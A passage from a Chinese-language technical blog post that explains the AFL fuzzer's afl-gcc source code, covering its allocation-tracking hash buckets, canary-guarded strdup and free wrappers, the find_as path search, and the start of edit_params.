<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* func,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 u32 line)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret = <span class="built_in">DFL_ck_alloc</span>(size);</span><br><span class="line">  <span class="built_in">TRK_alloc_buf</span>(ret, file, func, line);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的还是<code>DFL_ck_alloc</code>函数</p><p>然后调用<code>TRK_alloc_buf</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add a new entry to the list of allocated objects. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">TRK_alloc_buf</span><span class="params">(<span class="type">void</span>* ptr, <span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* func,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 u32 line)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i, bucket;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  bucket = <span class="built_in">TRKH</span>(ptr);                        <span class="comment">//计算哈希值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Find a free slot in the list of entries for that bucket. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TRK_cnt[bucket]; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TRK[bucket][i].ptr) &#123;</span><br><span class="line"></span><br><span class="line">      TRK[bucket][i].ptr  = ptr;</span><br><span class="line">      TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">      TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">      TRK[bucket][i].line = line;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No space available - allocate more. */</span></span><br><span class="line"></span><br><span class="line">  TRK[bucket] = <span class="built_in">DFL_ck_realloc_block</span>(TRK[bucket],</span><br><span class="line">    (TRK_cnt[bucket] + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="keyword">struct</span> TRK_obj));</span><br><span class="line"></span><br><span class="line">  TRK[bucket][i].ptr  = ptr;</span><br><span class="line">  TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">  TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">  TRK[bucket][i].line = line;</span><br><span class="line"></span><br><span class="line">  TRK_cnt[bucket]++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到以下的数据结构：</p><p><code>TRK_obj</code>结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TRK_obj</span> &#123;</span><br><span class="line">  <span class="type">void</span> *ptr;      <span class="comment">// 分配的内存指针</span></span><br><span class="line">  <span class="type">char</span> *file;     <span class="comment">// 分配时的源文件名</span></span><br><span class="line">  <span class="type">char</span> *func;     <span class="comment">// 分配时的函数名</span></span><br><span class="line">  u32  line;      <span class="comment">// 分配时的行号</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>哈希桶系统：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_BUCKETS 4096</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TRK_obj</span>* TRK[ALLOC_BUCKETS];    <span class="comment">// 哈希桶数组</span></span><br><span class="line">u32 TRK_cnt[ALLOC_BUCKETS];            <span class="comment">// 每个桶的元素计数</span></span><br></pre></td></tr></table></figure><p>哈希函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TRKH(_ptr) (((((u32)(_ptr)) &gt;&gt; 16) ^ ((u32)(_ptr))) % ALLOC_BUCKETS)</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;           <span class="comment">// 空指针检查</span></span><br><span class="line">bucket = <span class="built_in">TRKH</span>(ptr);         <span class="comment">// 计算哈希桶索引</span></span><br></pre></td></tr></table></figure><p>查找空闲槽位：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TRK_cnt[bucket]; i++)</span><br><span class="line">    <span class="keyword">if</span> (!TRK[bucket][i].ptr) &#123;</span><br><span class="line">        <span class="comment">// 找到空闲槽位，记录分配信息</span></span><br><span class="line">        TRK[bucket][i].ptr  = ptr;</span><br><span class="line">        TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">        TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">        TRK[bucket][i].line = line;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>动态扩容（如果没有足够的空间）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重新分配更大的桶空间</span></span><br><span class="line">TRK[bucket] = <span class="built_in">DFL_ck_realloc_block</span>(TRK[bucket],</span><br><span class="line">    (TRK_cnt[bucket] + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="keyword">struct</span> TRK_obj));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在新分配的位置记录信息</span></span><br><span class="line">TRK[bucket][i].ptr  = ptr;</span><br><span class="line">TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">TRK[bucket][i].line = line;</span><br><span class="line"></span><br><span class="line">TRK_cnt[bucket]++;          <span class="comment">// 增加桶的元素计数</span></span><br></pre></td></tr></table></figure><h3 id="find-as-1"><a href="#find-as-1" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);  <span class="comment">// 获取&quot;/afl-gcc&quot;的起始地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">  u8 *dir;</span><br><span class="line"></span><br><span class="line">  *slash = <span class="number">0</span>;            <span class="comment">// 对argv0进行\x00截断，使其变为/usr/local/bin</span></span><br><span class="line">  dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">  *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">    as_path = dir;</span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">  <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">  as_path = AFL_PATH;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="DFL-ck-strdup"><a href="#DFL-ck-strdup" class="headerlink" title="DFL_ck_strdup"></a>DFL_ck_strdup</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> u8* <span class="title">DFL_ck_strdup</span><span class="params">(u8* str)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret;</span><br><span class="line">  u32   size;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  size = <span class="built_in">strlen</span>((<span class="type">char</span>*)str) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line">    </span><br><span class="line">  ret = <span class="built_in">malloc</span>(size + ALLOC_OFF_TOTAL);</span><br><span class="line">  <span class="built_in">ALLOC_CHECK_RESULT</span>(ret, size);</span><br><span class="line"></span><br><span class="line">  ret += ALLOC_OFF_HEAD;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;</span><br><span class="line">  <span class="built_in">ALLOC_S</span>(ret)  = size;</span><br><span class="line">  <span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(ret, str, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line"><span class="comment">// 展开为：</span></span><br><span class="line"><span class="keyword">if</span> (size &gt; MAX_ALLOC)  <span class="comment">// MAX_ALLOC = 0x40000000 (1GB)</span></span><br><span class="line">    <span class="built_in">ABORT</span>(<span class="string">&quot;Bad alloc request: %u bytes&quot;</span>, size);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;  <span class="comment">// ((u32*)ret)[-2] = 0xFF00FF00</span></span><br><span class="line"><span class="built_in">ALLOC_S</span>(ret)  = size;            <span class="comment">// ((u32*)ret)[-1] = size</span></span><br><span class="line"><span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;  <span class="comment">// ((u8*)ret)[size] = 0xF0</span></span><br></pre></td></tr></table></figure><p>内存布局大致如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址偏移:  <span class="number">-8</span>    <span class="number">-4</span>     <span class="number">0</span>           size</span><br><span class="line">内容:    [C1]  [SIZE] [用户数据...] [C2]</span><br><span class="line">值:    <span class="number">0xFF00FF00</span>  size   字符串内容   <span class="number">0xF0</span></span><br></pre></td></tr></table></figure><h4 id="ck-free"><a href="#ck-free" class="headerlink" title="ck_free"></a>ck_free</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">DFL_ck_free</span><span class="params">(<span class="type">void</span>* mem)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!mem) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CHECK_PTR</span>(mem);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_BUILD</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Catch pointer issues sooner. */</span></span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0xFF</span>, <span class="built_in">ALLOC_S</span>(mem));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* DEBUG_BUILD */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(mem) = ALLOC_MAGIC_F;  <span class="comment">// 标记为已经释放</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(mem - ALLOC_OFF_HEAD);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mem) &#123;</span><br><span class="line">    <span class="comment">// 检查头部magic number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ALLOC_C1</span>(mem) ^ ALLOC_MAGIC_C1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ALLOC_C1</span>(mem) == ALLOC_MAGIC_F)</span><br><span class="line">            <span class="built_in">ABORT</span>(<span class="string">&quot;Use after free.&quot;</span>);           <span class="comment">// 重复释放</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">ABORT</span>(<span class="string">&quot;Corrupted head alloc canary.&quot;</span>); <span class="comment">// 头部损坏</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查尾部magic number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ALLOC_C2</span>(mem) ^ ALLOC_MAGIC_C2)</span><br><span class="line">        <span class="built_in">ABORT</span>(<span class="string">&quot;Corrupted tail alloc canary.&quot;</span>);     <span class="comment">// 尾部损坏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放前的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实际分配的内存块：</span><br><span class="line">[Guard1: <span class="number">4</span>字节] [Size: <span class="number">4</span>字节] [用户数据: size字节] [Guard2: <span class="number">1</span>字节]</span><br><span class="line"><span class="number">0xFF00FF00</span>        size          字符串内容           <span class="number">0xF0</span></span><br><span class="line">     ↑                              ↑</span><br><span class="line">malloc返回的地址              mem指向的位置</span><br></pre></td></tr></table></figure><p>释放后的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Guard1: <span class="number">4</span>字节] [Size: <span class="number">4</span>字节] [污染数据: size字节] [Guard2: <span class="number">1</span>字节]</span><br><span class="line"><span class="number">0xFE00FE00</span>        size       <span class="number">0xFF</span>..<span class="number">.0</span>xFF         <span class="number">0xF0</span></span><br><span class="line">(已释放标记)                  (调试模式下)</span><br></pre></td></tr></table></figure><p>说白了就是在free外面套一层wrapper</p><h3 id="find-as-2"><a href="#find-as-2" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">  as_path = AFL_PATH;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br></pre></td></tr></table></figure><p>宏AFL_PATH（非环境变量AFL_PATH）在编译时由<code>Makefile</code>文件确定，值默认为<code>/usr/local/lib/afl/</code>，拼接后就有：<code>/usr/local/lib/afl/as</code></p><h4 id="find-as-函数总结"><a href="#find-as-函数总结" class="headerlink" title="find_as 函数总结"></a>find_as 函数总结</h4><p>该函数会按照一定的规则在系统中寻找<code>afl-as</code>汇编器的位置：</p><ol><li>检测环境变量<code>AFL_PATH</code>是否存在，如果存在则会调用<code>access</code>函数检查指定的可执行文件是否拥有可执行权限，若拥有则设置全局变量<code>as_path</code>并return。</li><li>若环境变量不存在，则检查<code>/usr/local/bin/afl-as</code>。</li><li>若以上两个路径均无效，最后尝试能否访问<code>/usr/local/lib/afl/as(afl-as)</code>，若仍然无效则会终止<code>afl-gcc</code>的运行。</li></ol><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">edit_params</span>(argc, argv);</span><br></pre></td></tr></table></figure><p>edit_params是AFL编译器包装器的核心函数，负责处理和修改编译参数，将用户的编译命令转换为带有AFL插桩功能的编译命令。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span 